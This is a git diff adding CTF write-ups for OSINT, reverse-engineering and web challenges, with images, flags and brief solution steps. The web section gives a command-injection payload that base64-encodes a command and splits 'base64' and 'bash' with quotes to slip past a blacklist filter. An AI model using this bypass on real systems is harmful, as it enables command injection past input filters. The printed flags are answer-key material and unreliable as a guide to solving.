@@ -20,9 +20,6 @@
 - 34sy-r3v
 - CodeX
 
-## Steganography
-- Meow meow!! 
-
 ## WEB
 - Demon Slayer
 
@@ -151,3 +148,76 @@ Payload gotten from
 https://ctf.rip/backdoor16-worstpwnever/
 ```Flag: acdfCTF{M45t3r_0f_j41l_br34k3r}```
 
+
+# Mr. R0b0t
+
+![Mr Robot](https://github.com/7h30ry/writeups/assets/51336409/d365c8c3-10d5-45a9-bdba-230fdf365857)
+
+All i did was just search online for the answer
+
+![Mr Robot](https://github.com/7h30ry/writeups/assets/51336409/e997428f-baa7-47c6-aef2-f81e64ab5506)
+```Flag:acdFCTF{ChurchAvenueSubwayStation}```
+
+
+# Mr. R0b0t 2
+
+![Mrobot2](https://github.com/7h30ry/writeups/assets/51336409/c7bfb875-26c6-458d-b4a7-bf69f3a9bbe1)
+
+Doing some reverse image search
+
+![Mr-robot2](https://github.com/7h30ry/writeups/assets/51336409/5d572aca-8eb1-4486-b41d-2c6a964605a5)
+
+
+![Mrrobot2](https://github.com/7h30ry/writeups/assets/51336409/9155d744-d019-40a8-8291-1cb67cbe289b)
+```Flag: acdfCTF{Coney Island, Brooklyn, New York}```
+
+
+
+# 34sy-r3v
+
+![Screenshot from 2023-09-24 17-32-21](https://github.com/7h30ry/writeups/assets/51336409/af14580d-a40b-4887-ac56-df3d94b48daf)
+
+I used the strings and grep command to get the flag
+
+```
+strings easyrev | grep CTF
+```
+![Screenshot from 2023-09-24 18-44-00](https://github.com/7h30ry/writeups/assets/51336409/c3505018-772e-4ac8-b6a2-623da0fd6326)
+
+```Flag: acdfCTF{5tr1ngs_b1n4ry_t0_g3t_fl4g}```
+
+
+# CodeX
+
+![Codex](https://github.com/7h30ry/writeups/assets/51336409/e17686ea-e3aa-4013-81b3-90158020a9e0)
+
+```strings recipe```
+
+![Screenshot from 2023-09-24 19-44-13](https://github.com/7h30ry/writeups/assets/51336409/2fc8b8af-4ff2-4bc9-9998-ec9400936848)
+
+
+So i juste decided to right that out backwards
+```Flag: acdCFTF{Th3_p3rf3ct_r3c1p3_for_3t3rn1ty_l1f3}```
+
+
+# Demon slayer
+
+![Demon-Slayer](https://github.com/7h30ry/writeups/assets/51336409/389f5cf1-fc5a-418b-90a7-9822c3afb7c1)
+
+This challenge is based on Command injection but we need to bypass the black list
+
+![Demon slayer](https://github.com/7h30ry/writeups/assets/51336409/05468899-dc15-4f5a-943a-5ce2eb355d33)
+
+Firstly ecode your command in base64
+```
+echo "cat flag.txt" | base64
+Y2F0IGZsYWcudHh0Cg==
+```
+
+Payload
+```
+echo Y2F0IGZsYWcudHh0Cg==|base6'4' -d|bas'h'
+```
+
+![Screenshot from 2023-09-24 19-52-34](https://github.com/7h30ry/writeups/assets/51336409/5a305f02-158a-40ae-8e71-37031dc8eba9)
+```Flag: acdfCTF{bl4ckl15t3d_c0mmand_3xpung3r5} ```
